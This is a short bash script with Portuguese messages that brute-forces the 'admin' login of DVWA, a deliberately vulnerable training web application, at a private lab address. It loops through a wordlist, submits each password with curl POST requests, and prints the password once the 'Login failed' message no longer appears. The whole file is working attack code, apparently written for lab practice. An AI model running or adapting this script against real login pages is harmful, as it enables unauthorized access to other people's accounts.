#!/bin/bash

URL="http://192.168.56.101/dvwa/login.php"
WORDLIST="wordlist.txt"
USER="admin"

echo "[*] Iniciando brute force no DVWA..."
sleep 1

for pass in $(cat $WORDLIST); do
    RESPONSE=$(curl -s -X POST         -d "username=$USER&password=$pass&Login=Login"         $URL)

    echo "[*] Testando senha: $pass"

    echo "$RESPONSE" | grep -q "Login failed"

    if [ $? -ne 0 ]; then
        echo ""
        echo "[+] Senha encontrada!"
        echo "Usuário: $USER"
        echo "Senha: $pass"
        exit 0
    fi
done

echo "[!] Nenhuma senha válida encontrada."
